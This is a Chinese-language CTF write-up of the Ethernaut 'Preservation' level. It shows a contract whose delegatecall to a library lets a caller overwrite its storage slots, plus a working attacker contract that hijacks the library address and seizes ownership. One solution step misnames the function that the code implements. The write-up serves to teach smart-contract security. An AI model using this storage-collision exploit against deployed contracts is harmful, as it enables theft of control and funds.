# Ethernaut 16-Preservation

## 本关目标

- 成为合约的 owner

## 合约分析

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {

  // public library contracts
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner;
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  // 构造函数中设置了两个合约实例地址
  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress;
    timeZone2Library = _timeZone2LibraryAddress;
    owner = msg.sender;
  }

  //设置时间都是使用delegatecall，也就是会修改当前合约的slot0，timeZone1Library会被修改成传入的值
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp
  uint storedTime;

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```

## 解决方案

1. 构造 Hack 合约，它的状态变量布局前三个和 Preservation 合约一致
2. 在 Hack 中调用 Preservation.setFirstTime(address(this))；修改 timeZone1Library 为 Hack 合约地址
3. 在 Hack 中实现 setFirstTime()，方法中修改 owner 为传入参数
4. 在 Hack 中调用 Preservation.setFirstTime(msg.sender)；修改 owner

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./Preservation.sol";

contract Hack {
    // stores a timestamp
  uint storedTime;
  uint stored2Time;
  address owner;

  function hack(address _target) public {
      Preservation p = Preservation(_target);
      p.setFirstTime(uint256(uint160(address(this)))); // 执行完这一步，Preservation中的timeZone1Library 为 Hack 合约地址
      p.setFirstTime(uint256(uint160(msg.sender))); // 再次调用会调用Hack中的setTime
  }

  function setTime(uint _time) public {
    owner = address(uint160(_time));
  }
}
```
